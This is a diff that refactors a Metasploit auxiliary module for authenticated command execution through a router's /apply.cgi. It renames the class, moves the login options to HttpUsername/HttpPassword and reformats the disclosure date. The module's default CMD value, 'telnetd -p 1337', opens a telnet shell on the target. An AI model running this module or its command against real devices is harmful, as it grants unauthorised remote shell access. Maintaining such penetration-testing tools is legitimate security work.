@@ -1,12 +1,9 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-
-class Metasploit3 < Msf::Auxiliary
-
+class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
 
   def initialize(info = {})
@@ -28,20 +25,20 @@ class Metasploit3 < Msf::Auxiliary
           [ 'EDB', '24475' ],
           [ 'URL', 'http://www.s3cur1ty.de/m1adv2013-004' ]
         ],
-      'DisclosureDate' => 'Feb 05 2013'))
+      'DisclosureDate' => '2013-02-05'))
 
     register_options(
       [
-        OptString.new('USERNAME',[ true, 'User to login with', 'admin']),
-        OptString.new('PASSWORD',[ true, 'Password to login with', 'password']),
+        OptString.new('HttpUsername',[ true, 'User to login with', 'admin']),
+        OptString.new('HttpPassword',[ true, 'Password to login with', 'password']),
         OptString.new('CMD', [ true, 'The command to execute', 'telnetd -p 1337'])
-      ], self.class)
+      ])
   end
 
   def run
     uri = '/apply.cgi'
-    user = datastore['USERNAME']
-    pass = datastore['PASSWORD']
+    user = datastore['HttpUsername']
+    pass = datastore['HttpPassword']
 
     print_status("#{rhost}:#{rport} - Trying to login with #{user} / #{pass}")
 
